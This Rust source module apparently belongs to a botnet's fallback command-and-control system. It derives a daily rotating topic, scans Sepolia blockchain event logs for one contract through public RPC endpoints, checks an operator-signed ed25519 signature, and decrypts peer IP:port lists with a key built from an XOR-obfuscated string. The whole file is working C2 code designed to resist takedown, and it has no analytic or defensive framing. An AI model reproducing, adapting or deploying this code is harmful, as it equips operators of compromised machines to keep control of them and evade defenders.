use std::error::Error;
use std::time::{SystemTime, UNIX_EPOCH};
use serde::{Deserialize, Serialize};
use log::{info, warn, debug};
use ed25519_dalek::{Verifier, VerifyingKey, Signature};
use chacha20poly1305::{ChaCha20Poly1305, Key, Nonce};
use chacha20poly1305::aead::{Aead, KeyInit};

// --- CONFIGURATION ---
const RPC_ENDPOINTS: &[&str] = &[
    "https://rpc.sepolia.org",
    "https://ethereum-sepolia-rpc.publicnode.com",
    "https://1rpc.io/sepolia",
    "https://rpc2.sepolia.org"
];

const CONTRACT_ADDR: &str = "0x8A58Da9B24C24b9D6Faf2118eB3845FE7D4b13c5"; 
const EVENT_TOPIC_0: &str = "0xf5b2b2c9d749171f81d11324706509c313da5e730b72f44f535144b621404179";

const MASTER_PUB_KEY: [u8; 32] = [
    0x75, 0xbf, 0x34, 0x60, 0xf7, 0x00, 0x57, 0x06, 
    0xa3, 0x82, 0x85, 0x4d, 0x0b, 0x31, 0xc7, 0x63, 
    0x30, 0x4d, 0x15, 0x19, 0x18, 0xd1, 0xca, 0x87, 
    0xe7, 0x38, 0x99, 0xcc, 0x79, 0x3d, 0xb8, 0x6a
];

fn derive_fallback_key() -> [u8; 32] {
    use sha2::{Sha256, Digest};
    
    // XOR decode helper
    fn xd(encoded: &[u8], key: u8) -> Vec<u8> {
        encoded.iter().map(|b| *b ^ key).collect()
    }
    
    let mut hasher = Sha256::new();
    hasher.update(&MASTER_PUB_KEY);
    // "pryzrak-fallback-v1" XOR 0x55
    hasher.update(&xd(&[0x25, 0x3d, 0x34, 0x39, 0x21, 0x3a, 0x38, 0x78, 0x33, 0x34, 0x3b, 0x3b, 0x35, 0x34, 0x36, 0x3c, 0x78, 0x23, 0x64], 0x55));
    let result = hasher.finalize();
    
    let mut key = [0u8; 32];
    key.copy_from_slice(&result);
    key
}

#[derive(Deserialize, Debug)]
struct RpcResponse {
    result: Option<Vec<LogEntry>>,
    error: Option<serde_json::Value>,
}

#[derive(Deserialize, Debug)]
struct LogEntry {
    topics: Vec<String>,
    data: String,
    #[serde(rename = "blockNumber")]
    block_number: String,
}

fn get_daily_magic() -> String {
    let start = SystemTime::now();
    let since_the_epoch = start.duration_since(UNIX_EPOCH).expect("Time went backwards");
    let day_slot = since_the_epoch.as_secs() / 86400;
    
    let seed: u64 = 0x36A5EC9D09C60386;
    let mut state = day_slot ^ seed;
    state ^= state << 13;
    state ^= state >> 7;
    state ^= state << 17;
    
    format!("0x{:064x}", state)
}

/// Check blockchain for fallback config (runs in smol::unblock)
pub async fn check_sepolia_fallback() -> Option<(Vec<(String, u16)>, Vec<u8>)> {
    // Run blocking HTTP in thread pool
    smol::unblock(|| check_sepolia_fallback_blocking()).await
}

fn check_sepolia_fallback_blocking() -> Option<(Vec<(String, u16)>, Vec<u8>)> {
    let magic_topic = get_daily_magic();
    info!("[Sepolia] Checking Fallback channel. Magic: {}...", &magic_topic[0..10]);

    for endpoint in RPC_ENDPOINTS {
        debug!("[Sepolia] Checking RPC: {}", endpoint);
        match fetch_logs(endpoint, &magic_topic) {
            Ok(logs) => {
                if logs.is_empty() { continue; } 
                
                let count = logs.len();
                let start_idx = if count > 5 { count - 5 } else { 0 };
                
                info!("[Sepolia] Found {} logs. Processing last {}...", count, count - start_idx);
                
                for log in logs.iter().skip(start_idx).rev() {
                    if let Some((peers, blob)) = try_decrypt_payload(&log.data) {
                         info!("[Sepolia] Successfully recovered valid peers from Log");
                         return Some((peers, blob));
                    }
                }
                warn!("[Sepolia] All logs were invalid or failed signature check.");
            }
            Err(e) => warn!("[Sepolia] RPC {} Failed: {}", endpoint, e),
        }
    }
    None
}

fn fetch_logs(url: &str, topic: &str) -> Result<Vec<LogEntry>, Box<dyn Error>> {
    // Get current block number
    let block_req = serde_json::json!({
        "jsonrpc": "2.0",
        "method": "eth_blockNumber",
        "params": [],
        "id": 0
    });
    
    let block_resp: serde_json::Value = ureq::post(url)
        .timeout(std::time::Duration::from_secs(10))
        .send_json(&block_req)?
        .into_json()?;
    
    let current_block = block_resp["result"].as_str().unwrap_or("0x0");
    
    let current_num = u64::from_str_radix(current_block.trim_start_matches("0x"), 16).unwrap_or(0);
    let from_block = if current_num > 45000 { current_num - 45000 } else { 0 };
    let from_hex = format!("0x{:x}", from_block);
    
    let payload = serde_json::json!({
        "jsonrpc": "2.0",
        "method": "eth_getLogs",
        "params": [{
            "address": CONTRACT_ADDR,
            "topics": [EVENT_TOPIC_0, topic],
            "fromBlock": from_hex,
            "toBlock": "latest"
        }],
        "id": 1
    });

    let rpc_res: RpcResponse = ureq::post(url)
        .timeout(std::time::Duration::from_secs(10))
        .send_json(&payload)?
        .into_json()?;
    
    if let Some(err) = rpc_res.error {
        return Err(format!("RPC Error: {:?}", err).into());
    }
    
    Ok(rpc_res.result.unwrap_or_default())
}

fn try_decrypt_payload(hex_data: &str) -> Option<(Vec<(String, u16)>, Vec<u8>)> {
    let clean_hex = hex_data.trim_start_matches("0x");
    let bytes = hex::decode(clean_hex).ok()?;
    
    if bytes.len() < 81 { return None; }
    
    let iv_slice = &bytes[4..16];
    let sig_slice = &bytes[bytes.len()-64..]; 
    let encrypted_data = &bytes[16..bytes.len()-64];
    
    let signed_len = bytes.len() - 64;
    let signed_msg = &bytes[0..signed_len];
    
    let vk = VerifyingKey::from_bytes(&MASTER_PUB_KEY).ok()?;
    let signature = Signature::from_bytes(sig_slice.try_into().ok()?);
    
    if vk.verify(signed_msg, &signature).is_err() {
        return None;
    }
    
    let cipher = ChaCha20Poly1305::new(Key::from_slice(&derive_fallback_key()));
    let nonce = Nonce::from_slice(iv_slice);
    
    match cipher.decrypt(nonce, encrypted_data) {
        Ok(plaintext) => {
            if plaintext.len() < 145 {
                return None;
            }
            
            let magic_bytes: [u8; 4] = plaintext[0..4].try_into().ok()?;
            if u32::from_le_bytes(magic_bytes) != 0x52224AC4 && u32::from_be_bytes(magic_bytes) != 0x52224AC4 {
                 return None;
            }

            let ip_len = plaintext[16];
            let ip_bytes = &plaintext[17..17+64];
            let safe_len = std::cmp::min(ip_len as usize, 64);
            let ip_str = String::from_utf8_lossy(&ip_bytes[0..safe_len]).to_string();
            
            if let Some(peers) = parse_peers(&ip_str) {
                return Some((peers, plaintext));
            }
            None
        },
        Err(_) => None 
    }
}

fn parse_peers(text: &str) -> Option<Vec<(String, u16)>> {
    let mut peers = Vec::new();
    let clean_text = text.trim_matches(char::from(0));
    
    for part in clean_text.split(';') {
        if let Some((ip, port_str)) = part.split_once(':') {
            if let Ok(port) = port_str.parse::<u16>() {
                peers.push((ip.to_string(), port));
            }
        }
    }
    if peers.is_empty() { None } else { Some(peers) }
}
